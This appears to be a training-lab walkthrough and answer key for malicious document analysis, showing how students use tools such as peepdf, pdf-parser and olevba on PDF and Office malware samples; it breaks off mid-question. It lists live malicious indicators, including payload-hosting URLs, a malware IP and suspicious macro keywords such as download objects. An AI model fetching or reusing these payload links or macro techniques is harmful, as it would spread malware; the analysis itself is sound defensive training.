

| Section                              | Question Number | Answer                                                  |
| ------------------------------------ | --------------- | ------------------------------------------------------- |
| PDF Document Analysis (AgentTesla)   | Question 1      | https://infplaute.com/international-commercial          |
| PDF XObject Analysis (Quakbot)       | Question 1      | Price\_Quote.bat                                        |
| Analysis of Malicious Office Files   | Question 1      | microsoft.xmlhttp                                       |
| Office Document - VBA Macro Analysis | Question 1      | Mohammed Alkuwari                                       |
| Obfuscated VBA Macro Analysis        | Question 1      | "Open this Transaction Recipt Again!                    |
| Analysis of External Relationships   | Question 1      | http://gurl.pro/u8-drp                                  |
| Malicious Excel Macro Analysis       | Question 1      | Start-Process                                           |
| Obfuscated Excel 4.0 Macro (XLM)     | Question 1      | DONE                                                    |
| Analysis of XLL Add-ins              | Question 1      | 8521000125423.exe                                       |
| Excel-DNA C# XLL Add-ins (Lokibot)   | Question 1      | xlAutoOpen                                              |
| Analysis of Malicious RTF Files      | Question 1      | beautifulldaykiss.vbs                                   |
| Analysis Using CyberChef             | Question 1      | Normal.dotm                                             |
| Malicious CHM Analysis               | Question 1      | mshta.exe                                               |
| Skills Assessment - Maldoc Analysis  | Question 1      | 2.59.254.18                                             |
| Skills Assessment - Maldoc Analysis  | Question 2      | lawzx.exe                                               |
| Skills Assessment - Maldoc Analysis  | Question 3      | CreateProcessW                                          |
| Skills Assessment - Maldoc Analysis  | Question 4      | https://gitlab.com/DemoTrojan/real/-/raw/main/check.bat |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# PDF Document Analysis (AgentTesla)

## Question 1

### "Locate the sample in the directory "C:\\Tools\\Maldoc\\PDF\\Demo\\Samples\\WikiLoader". Perform analysis of the objects within the sample. What is the value of /URI in object 7? Answer format is a URL."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.180 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[00:21:29:325] [20647:20648] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[00:21:29:325] [20647:20648] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[00:21:29:325] [20647:20648] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[00:21:29:374] [20647:20648] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:21:29:374] [20647:20648] [WARN][com.freerdp.crypto] - CN = Logging-VM
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.232.180:3389) 
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - 	Logging-VM
[00:21:29:375] [20647:20648] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.232.180:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and will list the contents of the `C:\Tools\Maldoc\PDF\Demo\Samples\WikiLoader\` directory to find a single PDF named `Invoice_2930_from_Sidley Austin LLP.pdf` on which they are going to perform the analysis:

Code: cmd

```cmd
dir "C:\Tools\Maldoc\PDF\Demo\Samples\WikiLoader\"
```

```
C:\Users\Administrator>dir "C:\Tools\Maldoc\PDF\Demo\Samples\WikiLoader\"

 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Tools\Maldoc\PDF\Demo\Samples\WikiLoader

08/06/2024  06:15 AM    <DIR>          .
08/06/2024  06:15 AM    <DIR>          ..
07/18/2024  12:20 AM            20,157 Invoice_2930_from_Sidley Austin LLP.pdf
               1 File(s)         20,157 bytes
               2 Dir(s)   6,244,814,848 bytes free
```

Subsequently, students will use `peepdf` in interactive console mode and notice the objects present in the `Object with URIs (2):` variable:

Code: cmd

```cmd
peepdf "C:\Tools\Maldoc\PDF\Demo\Samples\WikiLoader\Invoice_2930_from_Sidley Austin LLP.pdf" -i
```

```
C:\Users\Administrator>peepdf "C:\Tools\Maldoc\PDF\Demo\Samples\WikiLoader\Invoice_2930_from_Sidley Austin LLP.pdf" -i
[*] Warning: STPyV8 is not installed
[*] Warning: pylibemu is not installed

File: Invoice_2930_from_Sidley Austin LLP.pdf
MD5: f73ec470a05913c255383ba99e68dbff
SHA1: 14d0a9ef8663ab11fb5933cd1d0f2af5f12a3ea0
SHA256: 817613ad7b868e48120f79e6d971698ee7dcbb6bdca2e8958566e4895b634abf
Size: 20157 bytes
IDs:
        Version 0: [ <5F5AA0CAE2B9222344D54D542B1587D2> <5F5AA0CAE2B9222344D54D542B1587D2> ]

PDF Format Version: 1.7
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 20
Streams: 9
URIs: 2
Comments: 0
Errors: 0

Version 0:
        Catalog: 2
        Info: 1
        Objects (20): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
        Compressed objects (10): [1, 4, 5, 6, 7, 9, 10, 15, 16, 19]
        Streams (9): [3, 8, 11, 12, 13, 14, 17, 18, 20]
        Xref streams (1): [20]
        Object streams (1): [3]
        Encoded (9): [3, 8, 11, 12, 13, 14, 17, 18, 20]
        Decoding errors (1): [17]
        Objects with URIs (2): [6, 7]
```

Students will begin by analyzing the seventh object and finding a URL within the `/URI` property:

Code: cmd

```cmd
object 7
```

```
PPDF> object 7

<< /A << /S /URI
/URI {hidden}
 >>
/Border [ 0 0 0 ]
/C [ 0 0 0 ]
/F 4
/M D:20240306191731+02'00'
/NM 85ae8e0f-7e55-46e9-8b450cf166584863
/P 5 0 R
/Rect [ 229.75 397.785278 382.75 611.714722 ]
/Subtype /Link
/Type /Annot
 >>
```

Answer: `https://infplaute.com/international-commercial`

# PDF XObject Analysis (Quakbot)

## Question 1

### "Investigate the PDF sample located at "C:\\Tools\\MalDoc\\PDF\\Demo\\Samples\\RedLineStealer\\Price\_Quote.pdf". Figure out the URI embedded in the document. Type the name of the file hosted at that remote URL. Answer format is "*****\_*****.bat""

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.39.177 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[00:56:33:842] [150703:150704] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:56:33:842] [150703:150704] [WARN][com.freerdp.crypto] - CN = Logging-VM
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.39.177:3389) 
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - 	Logging-VM
[00:56:33:842] [150703:150704] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.39.177:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and navigate to the `C:\Tools\Maldoc\PDF\Tools\pdf-parser\` directory:

Code: cmd

```cmd
cd C:\Tools\Maldoc\PDF\Tools\pdf-parser\
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Tools\Maldoc\PDF\Tools\pdf-parser\
```

Subsequently, students will utilize `pdf-parser.py` to scrutinize the `Price_Quote.pdf` PDF file located in the `C:\Tools\Maldoc\PDF\Demo\Samples\RedLineStealer\` directory and find a URL in the `/URI` property containing the name of the `.bat` file in the ninth object:

Code: cmd

```cmd
python .\pdf-parser.py "C:\Tools\Maldoc\PDF\Demo\Samples\RedLineStealer\Price_Quote.pdf"
```

```
C:\Tools\Maldoc\PDF\Tools\pdf-parser>python .\pdf-parser.py "C:\Tools\Maldoc\PDF\Demo\Samples\RedLineStealer\Price_Quote.pdf"

This program has not been tested with this version of Python (3.12.4)
Should you encounter problems, please use Python version 3.11.1
PDF Comment '%PDF-1.7\r\n'

PDF Comment '%\xb5\xb5\xb5\xb5\r\n'

obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 12 0 R, 26 0 R, 27 0 R

  <<
    /Type /Catalog
    /Pages 2 0 R
    /Lang (en-US)
    /StructTreeRoot 12 0 R
    /MarkInfo
      <<
        /Marked true
      >>
    /Metadata 26 0 R
    /ViewerPreferences 27 0 R

<SNIP>

obj 9 0
 Type:
 Referencing:

  <<
    /Subtype /Link
    /Rect [ 0 -0.12001 336.12 236.04]
    /BS
      <<
        /W 0
      >>
    /F 4
    /A
      <<
        /Type /Action
        /S /URI
        /URI (https://cdn.discordapp.com/attachments/1030202249588260947/1030826606312300705/{hidden})
      >>
    /StructParent 1
  
<SNIP>
```

Answer: `Price_Quote.bat`

# Analysis of Malicious Office Files

## Question 1

### "Run olevba.py with -a option on the file "C:\\Tools\\MalDoc\\Office\\Demo\\Samples\\QuasarRAT\\QuasarRAT.docx". This will show a list of suspicious keywords. Figure out the keyword that downloads files from the Internet. Type the keyword as your answer. Answer Format is m\*\*\*\*\*\*\*\*.\*\*\*\*\*\*\*"

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.170.32 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[01:11:56:423] [174628:174644] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:11:56:423] [174628:174644] [WARN][com.freerdp.crypto] - CN = Logging-VM
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.170.32:3389) 
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - 	Logging-VM
[01:11:56:424] [174628:174644] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.170.32:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and navigate to the `C:\Tools\Maldoc\Office\Tools\oletools\` directory:

Code: cmd

```cmd
cd C:\Tools\Maldoc\Office\Tools\oletools\
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Tools\Maldoc\Office\Tools\oletools\
```

Subsequently, students will utilize `olevba.py` to perform analysis against the `QuasarRAT.docx` file located in the `C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\` directory and scrutinize the output to find the keyword related to suspicious activity such as downloading files from the internet:

Code: cmd

```cmd
python .\olevba.py -a C:\Tools\Maldoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx
```

```
C:\Tools\Maldoc\Office\Tools\oletools>python .\olevba.py -a C:\Tools\Maldoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx

XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: C:\Tools\Maldoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: C:\Tools\Maldoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx - OLE stream: 'Macros/VBA/ThisDocument'
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: C:\Tools\Maldoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx - OLE stream: 'Macros/VBA/NewMacros'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|adodb.stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|{hidden}            |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

Answer: `microsoft.xmlhttp`

# Office Document - VBA Macro Analysis

## Question 1

### "Use olemeta.py to analyse the document properties. Find out who is the author of this document, and type the name of author as your answer."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.76.178 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[01:47:45:319] [229480:229481] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:47:45:319] [229480:229481] [WARN][com.freerdp.crypto] - CN = Logging-VM
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.76.178:3389) 
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - 	Logging-VM
[01:47:45:320] [229480:229481] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.76.178:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and navigate to the `C:\Tools\Maldoc\Office\Tools\oletools\` directory:

Code: cmd

```cmd
cd C:\Tools\Maldoc\Office\Tools\oletools\
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Tools\Maldoc\Office\Tools\oletools\
```

Subsequently, students will utilize `olemeta.py` to analyze the `3dfddb91261f5565596e3f014f9c495a.doc` file located in the `C:\Tools\Maldoc\Office\Demo\Samples\Havoc\` directory and find the name of the author in the value of the `author` property:

Code: cmd

```cmd
python .\olemeta.py C:\Tools\Maldoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc
```

```
C:\Tools\Maldoc\Office\Tools\oletools>python .\olemeta.py C:\Tools\Maldoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: C:\Tools\Maldoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |{hidden}                      |
|keywords             |                              |
|comments             |                              |
|template             |Testing.dot                   |
|last_saved_by        |{hidden}                      |
|revision_number      |5                             |
|total_edit_time      |1620                          |
|create_time          |2023-12-13 21:41:00           |
|last_saved_time      |2023-12-16 01:17:00           |
|num_pages            |1                             |

<SNIP>
```

Answer: `Mohammed Alkuwari`

# Obfuscated VBA Macro Analysis

## Question 1

### "When you extract VBA Macro code of this sample using olevba.py, there is a call to MsgBox. What is the content of this MsgBox function? Type it as your answer."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.172.191 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[02:17:20:889] [275341:275342] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[02:17:20:889] [275341:275342] [WARN][com.freerdp.crypto] - CN = Logging-VM
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.172.191:3389) 
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - Common Name (CN):
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - 	Logging-VM
[02:17:20:890] [275341:275342] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.172.191:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and navigate to the `C:\Tools\MalDoc\Office\Tools\oletools\` directory:

Code: cmd

```cmd
cd C:\Tools\MalDoc\Office\Tools\oletools\
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Tools\MalDoc\Office\Tools\oletools\
```

Subsequently, students will utilize `olevba.py` to analyze the `QuasarRAT.docx` file located in the `C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\` directory and scrutinize the results from the macro present in the `.docx` file, finding the message in the `MsgBox` call:

Code: cmd

```cmd
python .\olevba.py C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx
```

```
C:\Tools\Maldoc\Office\Tools\oletools>python .\olevba.py C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx

XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Function Wouynfb() As Byte
Wouynfb = 0

<SNIP>

Dim ¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢ As Integer
Dim ³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯®·¬©¥
Dim ¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶
¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢ = 1

MsgBox "{hidden}"

<SNIP>
```

Answer: `Open this Transaction Recipt Again!`

# Analysis of External Relationships

## Question 1

### "Locate the sample "C:\\Tools\\MalDoc\\Office\\Demo\\Samples\\SnakeKeylogger\\PO026037.docx" and investigate relationships with external links. Type the external link as your answer. Answer format is an HTTP URL."

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.135.65 /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution

[02:46:46:026] [321422:321423] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[02:46:46:026] [321422:321423] [WARN][com.freerdp.crypto] - CN = Logging-VM
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.135.65:3389) 
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - Common Name (CN):
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - 	Logging-VM
[02:46:46:026] [321422:321423] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.135.65:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y  
```

Students will open the command prompt and navigate to the `C:\Tools\MalDoc\Office\Tools\oletools\` directory:

Code: cmd

```cmd
cd C:\Tools\MalDoc\Office\Tools\oletools\
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Tools\MalDoc\Office\Tools\oletools\
```

Subsequently, students will utilize `oleobj.py` to analyze the `PO026037.docx` file located in the `C:\Tools\Maldoc\Office\Demo\Samples\SnakeKeylogger\` directory and find a relationship with an external link:

Code: cmd

```cmd
python .\oleobj.py C:\Tools\Maldoc\Office\Demo\Samples\SnakeKeylogger\PO026037.docx
```

```
C:\Tools\Maldoc\Office\Tools\oletools>python .\oleobj.py C:\Tools\Maldoc\Office\Demo\Samples\SnakeKeylogger\PO026037.docx

oleobj 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

-------------------------------------------------------------------------------
File: 'C:\\Tools\\Maldoc\\Office\\Demo\\Samples\\SnakeKeylogger\\PO026037.docx'
Found relationship 'attachedTemplate' with external link {hidden}
```

Answer: `http://gurl.pro/u8-drp`

# Malicious Excel Macro Analysis

## Question 1

### "Perform analysis of Excel VBA macro file "update-kb.xlsm" located at "C:\\Tools\\Maldoc\\Office\\Demo\\Samples\\Excel\\Demo\\VBA". The macro code runs the downloaded executable using a PowerShell cmdlet. Type the name of the PowerShell cmdlet as your answer. Answer format is \*\*\*\*\*-\*\*\*\*\*\*s"

After spawning the target students will establish an RDP session using the credentials `Administrator:P3n#31337@LOG`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'P3n#31337@LOG' /dynamic-resolution
```

```
┌─[eu-academy-3]─[10.10.14.44]─[htb-ac-8414@htb-j5lrcbmbh6]─[~]
